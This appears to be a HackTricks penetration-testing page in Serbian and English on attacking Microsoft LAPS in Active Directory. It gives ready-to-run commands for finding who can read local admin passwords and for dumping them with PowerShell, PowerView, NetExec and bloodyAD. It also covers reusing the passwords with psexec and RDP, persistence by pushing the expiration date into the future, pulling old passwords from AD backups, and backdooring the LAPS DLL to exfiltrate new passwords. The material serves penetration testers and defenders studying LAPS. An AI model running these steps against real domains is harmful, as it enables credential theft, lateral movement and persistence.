# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

Trenutno postoje **2 LAPS varijante** koje možete sresti tokom procene:

- **Legacy Microsoft LAPS**: čuva lozinku lokalnog administratora u **`ms-Mcs-AdmPwd`** i vreme isteka u **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ugrađen u Windows od April 2023 update-ova): i dalje može emulirati legacy mod, ali u native modu koristi **`msLAPS-*`** atribute, podržava **password encryption**, **password history** i **DSRM password backup** za domain controlere.

LAPS je dizajniran za upravljanje **lozinkama lokalnog administratora**, čineći ih **jedinstvenim, nasumičnim i često menjanim** na komputerima pridruženim domenu. Ako možete da čitate te atribute, obično možete **pivot as the local admin** na pogođeni host. U mnogim okruženjima, zanimljiv deo nije samo čitanje same lozinke, već i pronalaženje **ko je imao delegiran pristup** atributima lozinke.

### Legacy Microsoft LAPS attributes

U computer objektima domena, implementacija legacy Microsoft LAPS rezultira dodavanjem dva atributa:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS dodaje nekoliko novih atributa computer objektima:

- **`msLAPS-Password`**: clear-text password blob čuvan kao JSON kada encryption nije omogućen
- **`msLAPS-PasswordExpirationTime`**: planirano vreme isteka
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data za domain controllere
- **`msLAPS-CurrentPasswordVersion`**: GUID-based verzija praćenja koja se koristi u novijoj logici za detekciju rollback-a (Windows Server 2025 forest schema)

Kada je **`msLAPS-Password`** čitljiv, vrednost je JSON objekat koji sadrži ime naloga, vreme ažuriranja i clear-text lozinku, na primer:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Proverite da li je aktiviran
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Možete **preuzeti raw LAPS policy** sa `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i zatim koristiti **`Parse-PolFile`** iz paketa [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) da biste ovu datoteku konvertovali u čitljiv format.

### Legacy Microsoft LAPS PowerShell cmdlets

Ako je legacy LAPS modul instaliran, sledeći cmdlets su obično dostupni:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS dolazi sa novim PowerShell module-om i novim cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Nekoliko operativnih detalja je važno ovde:

- **`Get-LapsADPassword`** automatski rukuje sa **legacy LAPS**, **clear-text Windows LAPS** i **encrypted Windows LAPS**.
- Ako je password encrypted i možeš da ga **read** ali ne i **decrypt**-uješ, cmdlet vraća metadata, ali ne i clear-text password.
- **Password history** je dostupna samo kada je omogućena **Windows LAPS encryption**.
- Na domain controller-ima, vraćeni source može biti **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** se takođe može koristiti da se otkrije **ko može da read-uje password i da ga read-uje**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Ako je **`msLAPS-Password`** čitljiv, parsiraj vraćeni JSON i izdvoji **`p`** za lozinku i **`n`** za ime upravljanog lokalnog admin naloga.

### Linux / remote tooling

Savremeni tooling podržava i legacy Microsoft LAPS i Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Napomene:

- Skorije **NetExec** verzije podržavaju **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, i **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** je i dalje koristan za **legacy Microsoft LAPS** sa Linux-a, ali cilja samo **`ms-Mcs-AdmPwd`**.
- Ako okruženje koristi **encrypted Windows LAPS**, običan LDAP read nije dovoljan; moraš takođe biti **authorized decryptor** ili zloupotrebiti podržanu decrypt putanju.

### Zloupotreba directory synchronization

Ako imaš domain-level **directory synchronization** prava umesto direktnog read pristupa na svaki computer object, LAPS i dalje može biti zanimljiv.

Kombinacija **`DS-Replication-Get-Changes`** sa **`DS-Replication-Get-Changes-In-Filtered-Set`** ili **`DS-Replication-Get-Changes-All`** može da se koristi za sinhronizaciju **confidential / RODC-filtered** atributa kao što je legacy **`ms-Mcs-AdmPwd`**. BloodHound ovo modeluje kao **`SyncLAPSPassword`**. Pogledaj [DCSync](dcsync.md) za background o replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeration LAPS-a kroz nekoliko funkcija.\
Jedna je parsiranje **`ExtendedRights`** za **sve computere sa omogućenim LAPS-om.** Ovo prikazuje **groups** kojima je posebno **delegirano da čitaju LAPS passwords**, a to su često users u protected groups.\
**Account** koji je **pridružio computer** domeni dobija `All Extended Rights` nad tim hostom, i ovo pravo daje **account**-u mogućnost da **čita passwords**. Enumeration može da pokaže user account koji može da čita LAPS password na hostu. Ovo može da nam pomogne da **target specific AD users** koji mogu da čitaju LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Ako nemate interaktivni PowerShell, ovu privilegiju možete zloupotrebiti udaljeno preko LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Ovo dumpuje sve LAPS tajne koje korisnik može da čita, omogućavajući vam da se krećete lateralno sa drugačijom lozinkom lokalnog administratora.

## Korišćenje LAPS lozinke
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Datum isteka

Jednom kada si admin, moguće je **dobiti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćeš **postaviti datum isteka u budućnost**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS koristi **`msLAPS-PasswordExpirationTime`** umesto toga:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Šifra će se i dalje rotirati ako **admin** koristi **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ili ako je omogućeno **Do not allow password expiration time longer than required by policy**.

### Recovering historical passwords from AD backups

Kada je omogućeno **Windows LAPS encryption + password history**, montirani AD backupovi mogu postati dodatni izvor tajni. Ako možete da pristupite montiranom AD snapshot-u i koristite **recovery mode**, možete da upitujete starije sačuvane šifre bez komunikacije sa live DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Ovo je uglavnom relevantno tokom **AD backup theft**, **offline forensics abuse** ili **disaster-recovery media access**.

### Backdoor

Originalni source code za legacy Microsoft LAPS može se naći [ovde](https://github.com/GreyCorbel/admpwd), zato je moguće ubaciti backdoor u code (na primer unutar `Get-AdmPwdPassword` metode u `Main/AdmPwd.PS/Main.cs`) koji će na neki način **exfiltrate new passwords or store them somewhere**.

Zatim, compile novi `AdmPwd.PS.dll` i uploaduj ga na mašinu u `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i promeni modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
